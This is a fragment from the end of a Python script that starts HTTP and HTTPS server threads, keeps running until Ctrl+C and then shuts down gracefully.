        sys.exit(1)
    
    # Start servers
    server_threads = []
    
    # HTTP server
    http_thread = threading.Thread(target=run_http_server, daemon=True)
    http_thread.start()
    server_threads.append(http_thread)
    
    # HTTPS server (if possible)
    https_thread = threading.Thread(target=run_https_server, daemon=True)
    https_thread.start()
    server_threads.append(https_thread)
    
    print("[*] Servers running. Press Ctrl+C to stop.\n")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n[*] Shutting down gracefully...")
        logger.info("Operation terminated by user")
        sys.exit(0)
